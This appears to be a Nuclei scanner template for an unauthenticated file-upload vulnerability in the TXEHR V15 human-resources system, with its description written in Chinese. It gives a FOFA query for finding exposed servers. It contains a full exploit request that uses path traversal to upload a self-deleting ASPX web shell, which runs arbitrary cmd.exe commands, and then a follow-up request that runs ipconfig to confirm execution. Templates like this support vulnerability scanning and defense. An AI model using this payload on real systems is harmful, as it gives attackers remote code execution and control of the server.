id: tongxiangHR-TXEHR_V15_hdlUploadFile-File-upload

info:
  name: 同享人力资源管理系统-TXEHR V15 hdlUploadFile.ashx 任意文件上传漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="/Assistant/Default.aspx"
    同享人力资源管理系统-TXEHR V15 hdlUploadFile.ashx 接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486126&idx=1&sn=f5fb3bd6c1284bcff3e5b266892c320e&chksm=c267bf9df510368b20023fc9f814aec2ffcbe96b4140cde34cabec6934562d896e64107664b3&token=803667191&lang=zh_CN#rd
  tags: File upload


  
http:
  - raw:
      - |
        POST /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/rce HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805

        -----------------------------142851345723692939351758052805
        Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
        Content-Type: text/plain

        <%@ Page Language="Jscript" validateRequest="false" %>
        <%
        var c=new System.Diagnostics.ProcessStartInfo("cmd");
        var e=new System.Diagnostics.Process();
        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
        c.UseShellExecute=false;
        c.RedirectStandardOutput=true;
        c.RedirectStandardError=true;
        e.StartInfo=c;
        c.Arguments="/c " + Request.Item["cmd"];
        e.Start();
        out=e.StandardOutput;
        EI=e.StandardError;
        e.Close();
        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
        System.IO.File.Delete(Request.PhysicalPath);
        Response.End();%>
        -----------------------------142851345723692939351758052805--
  - raw:
      - |
        GET /Style/rce.aspx?cmd=ipconfig HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Windows IP'
      - type: status
        status: 
          - 200